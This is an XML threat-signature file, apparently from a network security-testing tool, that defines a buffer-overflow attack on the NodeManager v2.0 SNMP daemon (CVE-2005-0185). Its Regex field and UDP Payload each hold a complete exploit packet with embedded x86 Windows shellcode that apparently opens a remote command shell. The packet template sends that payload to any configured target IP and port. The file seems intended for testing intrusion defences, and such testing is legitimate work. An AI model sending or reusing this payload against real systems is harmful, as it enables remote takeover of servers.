@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="NodeManager Buffer Overflow Attack"/>
+    <EngDesc display="true" value="This threat sends a buffer overflow targeted at the NodeManager SNMP daemon, attempting to gain a remote shell.  SNMP typically listens on UDP port 161."/>
+    <Intent display="true">
+      <item value="Unauthorized_Use"/>
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="SNMP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true"/>
+    <Known_Products_Affected display="true">
+      <item value="NodeManager"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="NodeManager_v2.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.security.org.sg/vuln/nodemanager200.html"/>
+    <CVEID display="true" value="CVE-2005-0185"/>
+    <bugtraqID display="true" value="12283"/>
+    <OSVDB display="true" value="13027"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="0000010189c69c3c00c000a80001003c6b6c58ad"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742200490937500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X30\X82\X02\X44\X02\X01\X00\X04\X06\X70\X75\X62\X6C\X69\X63\XA4\X82\X02\X35\X06\X09\X2B\X06\X01\X02\X03\X04\X05\X06\X07\X40\X04\X7F\X00\X00\X01\X02\X01\X02\X02\X01\X00\X43\X02\X12\X34\X30\X82\X02\X16\X30\X82\X02\X12\X06\X08\X2B\X06\X01\X02\X03\X04\X05\X06\X04\X82\X02\X04\X41\X41\X41\X41\X41\X41\X41\X41\X90\X90\X90\XCC\XEB\X62\X55\X8B\XEC\X51\X56\X57\X8B\X5D\X08\X8B\X73\X3C\X8B\X74\X33\X78\X03\XF3\X8B\X7E\X20\X03\XFB\X8B\X4E\X18\X56\X33\XD2\X8B\X37\X03\X75\X08\X33\XDB\X33\XC0\XAC\X85\XC0\X74\X09\XC1\XCB\X0C\XD1\XCB\X03\XD8\XEB\XF0\X3B\X5D\X0C\X74\X0B\X83\XC7\X04\X42\XE2\XDE\X5E\X33\XC0\XEB\X17\X5E\X8B\X7E\X24\X03\X7D\X08\X66\X8B\X04\X57\X8B\X7E\X1C\X03\X7D\X08\X8B\X04\X87\X03\X45\X08\X5F\X5E\X59\X8B\XE5\X5D\XC3\X55\X8B\XEC\X33\XC9\XB1\XC8\X2B\XE1\X32\XC0\X8B\XFC\XF3\XAA\XB1\X30\X64\X8B\X01\X8B\X40\X0C\X8B\X70\X1C\XAD\X8B\X58\X08\X89\X5D\XFC\X68\X8E\X4E\X0E\XEC\XFF\X75\XFC\XE8\X70\XFF\XFF\XFF\X83\XC4\X08\XBB\XAA\XAA\X6C\X6C\XC1\XEB\X10\X53\X68\X33\X32\X2E\X64\X68\X77\X73\X32\X5F\X54\XFF\XD0\X89\X45\XF8\XEB\X35\X5E\X8D\X7D\XF4\X33\XC9\XB1\X09\XFF\X36\XFF\X75\XFC\XE8\X40\XFF\XFF\XFF\X83\XC4\X08\X85\XC0\X75\X0E\X90\XFF\X36\XFF\X75\XF8\XE8\X2E\XFF\XFF\XFF\X83\XC4\X08\X89\X07\X33\XC0\XB0\X04\X03\XF0\X2B\XF8\XE2\XD5\XEB\X29\XE8\XC6\XFF\XFF\XFF\X72\XFE\XB3\X16\X35\X54\X8A\XA1\XA4\XAD\X2E\XE9\XA4\X1A\X70\XC7\XD9\X09\XF5\XAD\XCB\XED\XFC\X3B\X7E\XD8\XE2\X73\XE7\X79\XC6\X79\XAD\XD9\X05\XCE\X54\X6A\X02\XFF\X55\XE0\X33\XC0\X50\X50\X50\X50\X6A\X01\X6A\X02\XFF\X55\XE4\X89\X45\XD0\X33\XC0\X50\XB8\XFD\XFF\XF8\X2E\X83\XF0\XFF\X50\X8B\XC4\X6A\X10\X50\XFF\X75\XD0\XFF\X55\XE8\X6A\X05\XFF\X75\XD0\XFF\X55\XEC\X85\XC0\X75\X68\X8B\XCC\X6A\X10\X8B\XDC\X33\XC0\X50\X50\X53\X51\XFF\X75\XD0\XFF\X55\XF0\X8B\XD0\X5B\X83\XF0\XFF\X74\X4E\X8B\XFC\X33\XC9\XB1\X64\X33\XC0\XF3\XAA\XC6\X04\X24\X44\X66\XC7\X44\X24\X2C\X01\X01\X89\X54\X24\X38\X89\X54\X24\X3C\X89\X54\X24\X40\X8B\XC4\X8D\X58\X44\XB9\XFF\X63\X6D\X64\XC1\XE9\X08\X51\X8B\XCC\X52\X53\X53\X50\X33\XC0\X50\X50\X50\X6A\X01\X50\X50\X51\X50\XFF\X55\XF4\X5B\X6A\XFF\XFF\X33\XFF\X55\XD4\XFF\X55\XD8"/>
+    <Created value="1139462345" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="SNMPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="0" TotalLength="" Identification="@random(0, FFFF)" FragmentOffset="0" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1026, 65535)" destPort="$SNMPdestPort" checksum="" length="" Payload="3082024402010004067075626C6963A482023506092B060102030405060740047F00000102010202010043021234308202163082021206082B06010203040506048202044141414141414141909090CCEB62558BEC5156578B5D088B733C8B74337803F38B7E2003FB8B4E185633D28B3703750833DB33C0AC85C07409C1CB0CD1CB03D8EBF03B5D0C740B83C70442E2DE5E33C0EB175E8B7E24037D08668B04578B7E1C037D088B04870345085F5E598BE55DC3558BEC33C9B1C82BE132C08BFCF3AAB130648B018B400C8B701CAD8B5808895DFC688E4E0EECFF75FCE870FFFFFF83C408BBAAAA6C6CC1EB10536833322E64687773325F54FFD08945F8EB355E8D7DF433C9B109FF36FF75FCE840FFFFFF83C40885C0750E90FF36FF75F8E82EFFFFFF83C408890733C0B00403F02BF8E2D5EB29E8C6FFFFFF72FEB31635548AA1A4AD2EE9A41A70C7D909F5ADCBEDFC3B7ED8E273E779C679ADD905CE546A02FF55E033C0505050506A016A02FF55E48945D033C050B8FDFFF82E83F0FF508BC46A1050FF75D0FF55E86A05FF75D0FF55EC85C075688BCC6A108BDC33C050505351FF75D0FF55F08BD05B83F0FF744E8BFC33C9B16433C0F3AAC604244466C744242C0101895424388954243C895424408BC48D5844B9FF636D64C1E908518BCC5253535033C05050506A0150505150FF55F45B6AFFFF33FF55D4FF55D8FF75D0FF55D850FF55DC41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141419C484300"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
